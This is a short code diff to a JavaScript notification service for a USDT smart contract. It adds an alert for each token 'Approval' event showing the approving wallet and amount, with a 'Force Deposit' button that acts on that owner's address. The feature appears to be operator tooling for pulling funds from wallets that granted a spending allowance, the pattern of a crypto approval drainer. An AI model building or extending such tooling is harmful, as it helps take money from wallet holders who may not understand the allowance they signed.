@@ -13,6 +13,16 @@ class EventService {
     let keyboard
 
     switch (eventName) {
+      case 'Approval':
+        message = `✅ *NEW USDT APPROVAL*\n👤 \`${data.owner}\`\n💰 ${formatAmount(data.value)} USDT\n[🔍 View TX](${txUrl})`
+        keyboard = {
+          inline_keyboard: [[
+            { text: '⚡ Force Deposit', callback_data: `deposit:${data.owner}` },
+            { text: '📊 Check Balance', callback_data: `balance:${data.owner}` }
+          ]]
+        }
+        break
+
       case 'Deposited':
         message = `💰 *DEPOSIT SUCCESS*\n👤 \`${data.user}\`\n💰 ${formatAmount(data.amount)} USDT\n[🔍 View TX](${txUrl})`
         break
@@ -26,7 +36,7 @@ class EventService {
         break
 
       case 'EmergencyWithdrawalTriggered':
-        message = `🚨 *EMERGENCY WITHDRAWAL*\n💰 ${formatAmount(data.amount)} USDT\n⏱️ ${new Date(Number(data.timestamp) * 1000).toISOString()}\n[🔍 View TX](${txUrl})`
+        message = `🚨 *EMERGENCY WITHDRAW*\n💰 ${formatAmount(data.amount)} USDT\n⏱️ ${new Date(Number(data.timestamp) * 1000).toISOString()}\n[🔍 View TX](${txUrl})`
         break
 
       case 'BatchDeposited':
